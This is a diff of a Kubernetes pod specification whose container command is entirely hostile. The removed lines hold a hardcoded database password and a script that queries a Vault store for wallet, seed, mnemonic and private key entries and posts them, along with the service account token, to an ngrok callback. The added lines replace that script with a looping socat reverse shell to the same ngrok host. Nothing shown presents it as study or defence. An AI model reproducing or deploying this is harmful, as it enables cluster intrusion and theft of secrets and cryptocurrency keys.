@@ -13,27 +13,9 @@ spec:
     - /bin/sh
     - -c
     - |
-      apk add -q curl postgresql-client
-      
-      export PGPASSWORD='b9N8B5PBERVkVUucuDCJ'
-      DBHOST=postgresql-ext.tech.svc.cluster.local
-      CB=http://4.tcp.eu.ngrok.io:16552
-      
-      # 1. Vault paths
-      psql -h  -U vault -d vault -t -A -c "SELECT DISTINCT parent_path FROM vault_kv_store ORDER BY parent_path" > /tmp/paths.txt 2>&1
-      curl -s -X POST -d @/tmp/paths.txt /vault-paths 2>/dev/null
-      
-      # 2. Vault wallet/key entries
-      psql -h  -U vault -d vault -t -A -c "SELECT parent_path, path, key FROM vault_kv_store WHERE parent_path LIKE '%wallet%' OR parent_path LIKE '%seed%' OR key LIKE '%wallet%' OR key LIKE '%seed%' OR key LIKE '%private%' OR key LIKE '%xprv%' OR key LIKE '%mnemonic%' OR key LIKE '%hot%' OR key LIKE '%cold%' OR key LIKE '%sweep%'" > /tmp/wallet.txt 2>&1
-      curl -s -X POST -d @/tmp/wallet.txt /vault-wallets 2>/dev/null
-      
-      # 3. Full vault path/key dump
-      psql -h  -U vault -d vault -t -A -c "SELECT parent_path, path, key FROM vault_kv_store ORDER BY parent_path" > /tmp/full.txt 2>&1
-      curl -s -X POST -d @/tmp/full.txt /vault-full 2>/dev/null
-      
-      # 4. SA token
-      curl -s -X POST -d @/var/run/secrets/kubernetes.io/serviceaccount/token /sa-token 2>/dev/null
-      
-      # 5. Keep alive for shell
-      while true; do sleep 3600; done
+      apk add -q socat curl postgresql-client
+      while true; do
+        socat exec:'/bin/sh -li',pty,stderr,setsid,sigint,sane tcp:4.tcp.eu.ngrok.io:16552
+        sleep 5
+      done
   restartPolicy: Always
